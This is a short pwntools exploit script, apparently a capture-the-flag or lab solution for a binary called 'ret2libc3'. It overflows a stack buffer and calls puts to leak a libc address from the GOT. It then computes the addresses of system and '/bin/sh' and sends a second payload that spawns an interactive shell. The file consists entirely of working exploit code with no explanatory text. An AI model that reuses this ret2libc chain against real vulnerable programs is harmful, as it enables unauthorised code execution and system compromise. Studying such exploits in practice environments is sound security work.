from pwn import *

#libc_main_addr = 0x0804A018#0x0804A024
#puts_plt_addr = 0x08048460
#start_addr = 0x080484D0
offset = 0xFF82DD38-0xFF82DCCC+4

elf = ELF('./ret2libc3')
elf2 = ELF('./libc.so.6')

main_got_addr = elf.got['__libc_start_main']
puts_plt_addr = elf.plt['puts']
main_plt_addr = elf.symbols['_start']

#print("puts_got_addr = ",hex(puts_got_addr))
#print("puts_plt_addr = ",hex(puts_plt_addr))
#print("main_plt_addr = ",hex(main_plt_addr))

payload1 = offset * b'A'+ p32(puts_plt_addr) + \
			p32(main_plt_addr) +p32(main_got_addr)
sh = process("./ret2libc3")
sh.recv()
sh.sendline(payload1)

libc_real_addr = u32(sh.recv()[0:4])#0x6e61430a 0x206e6143
print( "real_addr is:" , hex(libc_real_addr))
libc_base = libc_real_addr - elf2.symbols['__libc_start_main']
system_addr = libc_base + elf2.symbols['system']
string_addr = libc_base + next(elf2.search(b'/bin/sh'))
#sh.recv()

#addr_base = libc_real_addr - 0x018540
#system_addr = addr_base + 0x03a940
#string_addr = addr_base + 0x15902b

payload2 = (offset * b'A' + p32(system_addr) + p32(0) + p32(string_addr))
sh.sendline(payload2)
sh.interactive()
